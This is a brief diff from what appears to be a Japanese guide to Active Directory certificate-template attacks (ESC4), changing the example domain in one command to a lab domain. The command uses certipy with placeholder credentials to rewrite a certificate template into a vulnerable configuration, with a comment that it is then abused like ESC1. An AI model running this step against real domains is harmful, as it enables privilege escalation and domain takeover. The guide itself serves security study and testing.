@@ -23,7 +23,7 @@ ESC4 は、証明書テンプレートオブジェクト自体に対する強い
 
 ```
 # テンプレートを脆弱化（SAN 指定可能等に書き換え）
-certipy template -u user@corp.local -p 'Password123' -template 'VulnTemplate' \
+certipy template -u user@lab.local -p 'Password123' -template 'VulnTemplate' \
   -dc-ip <DC_IP> -write-default-configuration
 # 以降は ESC1 と同手順で悪用
 ```
